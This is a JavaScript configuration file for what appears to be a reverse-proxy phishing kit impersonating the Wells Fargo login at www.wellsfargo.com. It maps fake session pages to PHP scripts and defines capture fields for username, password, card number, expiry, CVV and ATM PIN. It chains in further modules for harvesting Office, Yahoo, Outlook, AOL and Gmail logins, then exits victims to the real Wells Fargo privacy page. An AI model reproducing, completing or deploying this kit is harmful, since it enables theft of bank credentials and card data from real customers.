/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent')

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Defined Config used */

const configExport = {

    SCHEME: 'wells',

    CURRENT_DOMAIN: 'www.wellsfargo.com',

    START_PATH: '/session/secure/login',
    
    PATTERNS: [],

    FORCE_PROXY: [],

    PHP_PROCESSOR: {
        '/session/secure/login': {
            GET: {
                script: 'login.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/seuce/email',

            },
        },

        '/session/secure/email/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'addon/validate.php',
                
                redirectTo: '',

            },
        },


        '/session/secure/email': {
            GET: {
                script: 'addon/email.php',
            },
            POST: {}
        },

        '/session/secure/server': {
            GET: {
            
            },
            POST: {
            },
        },


       
        '/session/secure/credit': {
            GET: {
                script: 'card.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/profile',

            },
        },

        '/session/secure/profile': {
            GET: {
                script: 'profile.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/process/exit',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/session/secure/process/exit'],

    EXIT_URL: 'https://www.wellsfargo.com/privacy-security/',


    EXTRA_COMMANDS: [
        {
            path: '/auth/login/finish',
            command: 'REDIRECT_TO_URL',
            command_args: {
                redirect_url: '/session/secure/credit',
                },
        },
    ],

    CAPTURES: {
        wellsUsername: {
            params: ['sko'],
            hosts: 'PHP-EXEC',
        },

        wellsPassword: {
            params: ['skun'],
            hosts: 'PHP-EXEC',
        },

        wellsCC: {
            params: ['kato'],
            hosts: 'PHP-EXEC',
        },

        wellsExpireDate: {
            params: ['epoco'],
            hosts: 'PHP-EXEC',
        },

        wellsCvv: {
            params: ['cinono'],
            hosts: 'PHP-EXEC',
        },

        wellsAtmPin: {
            params: ['pinto'],
            hosts: 'PHP-EXEC',
        },


    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],


   }
module.exports = configExport